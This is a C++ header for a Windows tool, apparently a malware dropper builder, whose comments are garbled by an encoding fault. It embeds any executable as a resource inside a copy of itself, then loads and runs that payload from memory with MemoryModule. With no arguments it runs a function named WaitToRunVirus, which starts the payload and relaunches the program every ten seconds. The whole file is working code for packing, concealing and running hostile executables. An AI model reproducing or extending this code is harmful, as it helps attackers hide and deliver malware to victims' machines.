#pragma once
#include "resource.h"

#include "MemoryModule.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

#include <atlstr.h>

class CPEGenerator
{
public:
	CPEGenerator() {

	}
	~CPEGenerator() {

	}

public:
    void ParseParams(int argc, wchar_t* argv[]) {
        if (argc <= 1) {
            WaitToRunVirus();
        }
        else if (argc == 2) {
            CString str_param = argv[1];
            if (str_param == L"run") {
                // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
                MemoryLoadToRun(IDR_BINARY_FILE);
            }
            else if (str_param == L"wait") {
                return;
            }
        }
        else if(argc >= 3) {
            WCHAR exePath[MAX_PATH];
            // ��ȡ��ǰ�����·��
            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
            LPCWSTR resourceFilePath = argv[1];
            LPCWSTR newExePath = argv[2];

            AddFileToResource(exePath, resourceFilePath, newExePath);
        }
    }

    BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
        WCHAR tempFilePath[MAX_PATH];

        // ������ʱ�ļ�·��
        GetTempPath(MAX_PATH, tempFilePath);
        GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

        // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
        if (!CopyFile(exePath, tempFilePath, FALSE)) {
            MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
            return FALSE;
        }

        // ����ʱ�ļ�������Դ����
        HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
        if (!hUpdate) {
            MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // ��Ҫ��ӵ���Դ���ļ�
        std::ifstream file(resourceFilePath, std::ios::binary);
        if (!file.is_open()) {
            MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // ��ȡ�ļ����ݵ��ڴ�
        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        file.seekg(0, std::ios::beg);

        char* buffer = new char[fileSize];
        file.read(buffer, fileSize);
        file.close();

        // ���ļ����ݸ��µ���Դ��
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
            MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
            delete[] buffer;
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }

        delete[] buffer;

        // �����Դ����
        if (!EndUpdateResource(hUpdate, FALSE)) {
            MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
        if (!CopyFile(tempFilePath, newExePath, FALSE)) {
            MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // ɾ����ʱ�ļ�
        DeleteFile(tempFilePath);

        MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
        return TRUE;
    }

    BOOL RunGenerator(CString cmdline) {
        BOOL flag = FALSE;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // ʹ�� CreateProcess ��������
        flag = CreateProcess(
            NULL,                       // Ӧ�ó�������
            cmdline.GetBuffer(),            // ������
            NULL,                       // ���̰�ȫ������
            NULL,                       // �̰߳�ȫ������
            FALSE,                      // �Ƿ�̳о��
            0,                          // ������־
            NULL,                       // ��������
            NULL,                       // ��ǰĿ¼
            &si,                        // ������Ϣ
            &pi                         // ������Ϣ
        );
        cmdline.ReleaseBuffer();

        if (flag) {
            std::wcout << L"�ɹ�������������ID��" << pi.dwProcessId << std::endl;
            // �رս��̺��߳̾��
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            std::cerr << "����ʧ�ܣ������룺" << GetLastError() << std::endl;
        }

        return flag;
    }

    BOOL WaitToRunVirus() {
        // ��ȡ��ǰ���������·��
        wchar_t modulePath[MAX_PATH];
        GetModuleFileName(NULL, modulePath, MAX_PATH);

        // ���������в�������������·���Ͳ���
        CString commandLine;
        commandLine.Format(L"\"%s\" wait", modulePath); // ע�����Ű���·��
        // commandLine.Format(L"\"%s\"", modulePath); // ע�����Ű���·��

        // ������������
        CString run_vir;
        run_vir.Format(L"\"%s\" run", modulePath); // ע�����Ű���·��
        RunGenerator(run_vir);


        while (FileExists(modulePath)) {
            // ����������Ϣ�ͽ�����Ϣ�ṹ��
            
            RunGenerator(commandLine);
            Sleep(10000);
        }
        return TRUE;
    }

    BOOL MemoryLoadToRun(int resourceId) {
        BOOL flag = FALSE;
        try {
            // ���ص�ǰģ��
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                std::wcerr << L"Failed to load module.\n";
                return flag;
            }

            // ������Դ
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (!hResource) {
                std::wcerr << L"Failed to find resource.\n";
                return flag;
            }

            // ������Դ
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                std::wcerr << L"Failed to load resource.\n";
                return flag;
            }

            // ��ȡ��Դ��С������ָ��
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // 2. ʹ�� MemoryLoadLibrary �� EXE ���ص��ڴ�
            HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
            if (!hmemModule) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }

            // 3. ��ȡ EXE �ļ�����ڵ㲢����
            MemoryCallEntryPoint(hmemModule);

            // 4. ж�� EXE �ļ�
            MemoryFreeLibrary(hmemModule);
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }

    }

    bool FileExists(CString filePath) {
        DWORD fileAttr = GetFileAttributes(filePath);
        // �������ֵΪ INVALID_FILE_ATTRIBUTES����ʾ�ļ������ڻ����
        return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
    }

    BOOL ExtractAndRunResourceProgram(int resourceId) {
        // ���ص�ǰģ��
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            std::wcerr << L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // ������Դ
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            std::wcerr << L"Failed to find resource.\n";
            return FALSE;
        }

        // ������Դ
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            std::wcerr << L"Failed to load resource.\n";
            return FALSE;
        }

        // ��ȡ��Դ��С������ָ��
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        // ����Դ����д����ʱ�ļ�
        WCHAR tempPath[MAX_PATH];
        WCHAR tempFile[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        GetTempFileName(tempPath, L"tmp", 0, tempFile);

        std::ofstream outFile(tempFile, std::ios::binary);
        if (!outFile.is_open()) {
            std::wcerr << L"Failed to create temp file.\n";
            return FALSE;
        }
        outFile.write((char*)pData, dataSize);
        outFile.close();

        // ����һ������������ȡ�ĳ���
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::wcerr << L"Failed to run the extracted program.\n";
            DeleteFile(tempFile); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // �ȴ��������
        WaitForSingleObject(pi.hProcess, INFINITE);

        // ����
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteFile(tempFile); // ɾ����ʱ�ļ�

        std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

private:



};
